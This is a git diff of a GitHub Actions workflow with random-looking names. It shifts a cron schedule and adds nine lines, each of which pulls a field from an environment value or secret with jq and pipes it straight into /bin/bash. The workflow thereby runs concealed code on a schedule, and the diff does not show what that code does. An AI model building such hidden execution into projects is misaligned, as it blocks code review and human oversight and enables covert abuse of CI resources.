@@ -3,7 +3,7 @@ name: fananghais
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 4/6 * * *'
+    - cron: '32 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: fananghais
         env:
-          z61632: ${{ secrets.z61632 }}
+          asvtu53: ${{ secrets.asvtu53 }}
         run: |
-          echo $z61632 | jq -r .iml441 | /bin/bash
-          echo $afpf70776 | jq -r .tbuxr367 | /bin/bash
-          echo $s213 | jq -r .oswl1 | /bin/bash
-          echo $bwej5 | jq -r .axe812 | /bin/bash
-          echo $i52304 | jq -r .yl4 | /bin/bash
+          echo $asvtu53 | jq -r .sd1688 | /bin/bash
+          echo $qeck48 | jq -r .kwdqk888 | /bin/bash
+          echo $cncy491 | jq -r .wy02849 | /bin/bash
+          echo $mbd194 | jq -r .kotb7317 | /bin/bash
+          echo $walj57 | jq -r .fsniv524 | /bin/bash
+          echo $joz5857 | jq -r .yn26285 | /bin/bash
+          echo $jr401 | jq -r .axnk1 | /bin/bash
+          echo $n0559 | jq -r .jl24 | /bin/bash
+          echo $ued4 | jq -r .oerv7327 | /bin/bash
 
